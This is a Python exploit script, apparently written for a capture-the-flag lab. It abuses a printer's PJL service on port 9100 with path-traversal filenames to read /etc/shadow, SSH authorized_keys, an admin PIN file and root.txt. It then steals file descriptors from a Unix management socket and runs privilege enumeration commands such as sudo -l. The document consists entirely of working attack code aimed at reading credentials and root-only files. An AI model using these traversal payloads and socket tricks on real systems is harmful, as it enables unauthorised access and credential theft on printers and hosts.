#!/usr/bin/env python3
"""Root prep: PJL read escapes + mgmt leak (must run as archivist for mgmt)."""
import array
import os
import socket
import subprocess
import sys

HOST, PORT = "127.0.0.1", 9100


def pjl_read(path: str, size: int = 512) -> bytes:
    spec = f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={size}\r\n'.encode()
    s = socket.socket()
    s.settimeout(6)
    s.connect((HOST, PORT))
    s.sendall(spec)
    try:
        return s.recv(8192)
    except socket.timeout:
        return b""
    finally:
        s.close()


def trigger_lockdown() -> None:
    s = socket.socket()
    s.settimeout(4)
    s.connect((HOST, PORT))
    s.sendall(b"@PJL FSQUERY NAME=\".\"\r\n")
    try:
        s.recv(1024)
    except socket.timeout:
        pass
    s.close()


def mgmt_leak() -> None:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect("/run/paperwork/mgmt.sock")
    msg, anc, _f, _a = s.recvmsg(4096, socket.CMSG_LEN * 32)
    print("mgmt_msg", msg.decode(errors="replace"))
    fds = []
    for _lvl, typ, data in anc:
        if typ == socket.SCM_RIGHTS:
            fds = array.array("i", data)
    print("mgmt_fds", list(fds))
    for fd in fds:
        try:
            print("--- fd", fd, "---")
            print(os.read(fd, 4096).decode(errors="replace"))
        finally:
            os.close(fd)
    s.close()


def main() -> None:
    print("uid", os.getuid(), os.getenv("USER"))
    print("\n=== PJL read escapes (root / pins) ===")
    paths = [
        ("../user.txt", 40),
        ("../../../etc/paperwork/admin_pins.conf", 64),
        ("../../../root/root.txt", 64),
        ("../../../../root/root.txt", 64),
        ("....//....//root/root.txt", 64),
        ("../../../etc/shadow", 128),
        ("../.ssh/authorized_keys", 128),
        ("logs/../../../../../root/root.txt", 64),
    ]
    for path, sz in paths:
        r = pjl_read(path, sz)
        print(path, "len", len(r), repr(r[:200]))

    print("\n=== trigger + mgmt (needs archivist) ===")
    trigger_lockdown()
    try:
        mgmt_leak()
    except Exception as e:
        print("mgmt_fail", e)

    print("\n=== local enum if archivist shell ===")
    for cmd in (
        "id; groups",
        "sudo -l 2>&1",
        "ls -la /root /root/root.txt 2>&1",
        "ls -la /run/paperwork/mgmt.sock",
        "curl -s http://127.0.0.1:1337/ | head -3",
    ):
        print(">", cmd)
        cp = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=8)
        print(cp.stdout[:500], cp.stderr[:200])


if __name__ == "__main__":
    main()